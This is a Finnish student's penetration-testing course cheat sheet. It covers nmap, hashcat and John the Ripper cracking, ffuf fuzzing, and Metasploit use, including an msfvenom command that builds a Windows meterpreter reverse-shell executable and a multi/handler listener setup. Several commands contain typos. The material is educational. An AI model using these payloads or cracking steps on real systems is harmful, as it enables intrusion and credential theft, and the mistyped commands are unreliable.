
    
 # H6
 
### Laitteisto
 
* Käyttöjärjestelmä	Microsoft Windows 10 Enterprise LTSC 64 bit
* Prosessori i5-6600
* RAM 16 GB
* Virtuaaliohjelmisto : Oracle VM VirtualBox
* Virtuaali käyttöjärjestelmä: Kali 2024.1 - 28th February, 2024 - The first 2024 Kali Rolling release. Kernel 6.6.0, Xfce 4.18.4

 ## A) Cheat sheet

### NMAP
 
    mmap 192.168.1.1 ##Scan a single IP
    nmap 192.168.1.1 192.168.2.1 ##Scan specific IPs
    nmap 192.168.1.1-254 ##Scan a range
    nmap scanme.nmap.org ##Scan a domain
    nmap 192.168.1.0/24 ##Scan using CIDR notation
    -iL nmap -iL targets.txt ##Scan targets from a file
    -iR nmap -iR 100 ##Scan 100 random hosts
    -exclude nmap -exclude 192.168.1.1 ##Exclude listed host

### HASHCAT
    
    hashid -m 'tiivistejokatunnistaahaschatalgorithim'

Komento tunnistaa tiivisteen muodon ja antaa Hascat tilan millä tiiviste voidaan murtaa

    hashcat -m 0 '6d9f3a7ed4d276cfd46f721079971171' /usr/share/wordlists/rockyou.txt

    **FFUF**

Fuzzaamiseen käytetty ohjelma.

    ./ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://127.0.0.2:8000/FUZZ

Komento pilkottuna: 

 - ./fuff : Ajaa FFuf ohjelman
 - -w : Mitä sanalistaa ohjelma käyttää
 - /usr/share/wordlists/wfuzz/general/common.txt : Sanalistani sijainti
 - -u : Määrittää kohteen
 - http:127.0.0.2:8000/FUZZ : Fuzz sana on placeholder. Ohjelma kokeilee siihen kohtaan sanalistassa olevat vaihtoehdot.

**John The ripper**

John the ripper on Hashcatin tapainen ohjelma joka toimii hieman eri tavalla.

Käyttö:

    ./john tero.zip.hash ## Luo tiivisteen tiedostomuodosta joka on salasana suojattu

    ./john tero.zip.hash ## Ajaa ohjelman ja murtaa tiedoston tero.zip.hash

John the ripper ei mielestäni ole hirveän käyttömukava ja Hashcat on mieluisampi.

**MSFVENOM ja METASPLOITABLE**

MSFVENOM avulla voi luoda ajettavia haittaohjelmia. Msfvenomin käyttö jäi minulle hieman epäselväksi mutta sivustolta : https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom sain hyviä vinkkejä.

    msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>

Esimerkki

    msfv -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=80 -f exe

Yllöoleva komento luo reverse tcp haittaohjelman joka kuuntelee osoitetta 127.0.0.1:80 ja ohjelma on .exe ajettava.

Metasploitablen käyttöön löysin hyvän sivuston missä vinkkejä sen käytöstä: https://www.comparitech.com/net-admin/metasploit-cheat-sheet/

Multi/handler:

    msfconsole
    use multi/handler/payload
    SET payload <haittaohjelma>
    SET LHOST <kuunteluosoite>
    SET LPORT <kuunteluportti>
    run -j ## Ajaa multihandlerin taustalla.

    
Metasploitableen on olemassa hyvä cheatsheet kuvana: 

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/68fbebe5-8878-4be8-925f-cfa19839fb80)

Kuvan lähde: https://www.comparitech.com/net-admin/metasploit-cheat-sheet/

**Pencode**

Pencode avulla voi helposti koodata stringejä haluamaksi

    echo 'hello world' | pencode md5   ## Koodaa hello world MD5 tiivisteeksi     
        5eb63bbbe01eeed093cb22bb8f5acdc3 ##MD5 tiiviste****


    pencode - complex payload encoder v0.4

    Usage: ./pencode FUNC1 FUNC2 FUNC3...
    
    ./pencode reads input from stdin by default, which is typically piped from another process.
    
    OPTIONS:
    -input reads input from a file, line by line.
    
    ENCODERS
      b64encode         - Base64 encoder
      hexencode         - Hex string encoder
      htmlescape        - HTML escape
      jsonescape        - JSON escape
      unicodeencodeall  - Unicode escape string encode (all characters)
      urlencode         - URL encode reserved characters
      urlencodeall      - URL encode all characters
      utf16             - UTF-16 encoder (Little Endian)
      utf16be           - UTF-16 encoder (Big Endian)
      xmlescape         - XML escape
    
    DECODERS
      b64decode         - Base64 decoder
      hexdecode         - Hex string decoder
      htmlunescape      - HTML unescape
      jsonunescape      - JSON unescape
      unicodedecode     - Unicode escape string decode
      urldecode         - URL decode
      xmlunescape       - XML unescape
    
    HASHES
      md5               - MD5 sum
      sha1              - SHA1 checksum
      sha224            - SHA224 checksum
      sha256            - SHA256 checksum
      sha384            - SHA384 checksum
      sha512            - SHA512 checksum
    
    OTHER
      filename.tmpl     - Replaces string #PAYLOAD# in content of a file that has .tmpl extension.
      lower             - Convert string to lowercase
      upper             - Convert string to uppercase


 
## B)


## Lähteet



Tunkeutumistestaus 2024, Tero Karvinen (https://terokarvinen.com/2024/eettinen-hakkerointi-2024/)

Oracle VM Virtual Box versio 7.0.14  (https://www.virtualbox.org/)

Kali 2024.1 - 28th February, 2024 - The first 2024 Kali Rolling release. Kernel 6.6.0, Xfce 4.18.4. (https://www.kali.org/get-kali/#kali-platforms)

 WADComs  (https://wadcoms.github.io/)

 WithSecuren tarjoamat luentokalvot




#### Tehnyt Roi Partanen 28.4.2024
